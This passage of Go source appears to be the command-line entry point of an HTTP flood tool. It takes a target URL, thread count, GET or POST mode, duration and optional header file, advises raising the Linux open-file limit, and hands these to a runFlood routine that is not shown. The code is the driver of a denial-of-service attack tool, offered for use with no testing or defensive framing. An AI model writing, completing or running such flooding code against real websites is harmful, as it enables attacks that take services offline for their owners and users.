		fmt.Println("If you are using linux please run 'ulimit -n 999999' first!!!")
		fmt.Println("Usage: ", os.Args[0], "<url> <threads> <get/post> <seconds> <header.txt/nil>")
		os.Exit(1)
	}
	if os.Args[3] != "get" && os.Args[3] != "post" {
		println("Wrong mode, Only can use \"get\" or \"post\"")
		return
	}
	threads, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Threads should be a integer")
		return
	}
	limit, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Println("limit should be a integer")
		return
	}
	logger := &logBuffer{console: true, keep: true, maxKeep: 10000}
	cliPreset := "default"
	if os.Args[5] != "nil" {
		cliPreset = "custom"
	}
	if err := runFlood(os.Args[1], threads, 100, os.Args[3], limit, os.Args[5], cliPreset, true, nil, nil, logger); err != nil {
		fmt.Println("Error:", err)
		os.Exit(1)
	}
}
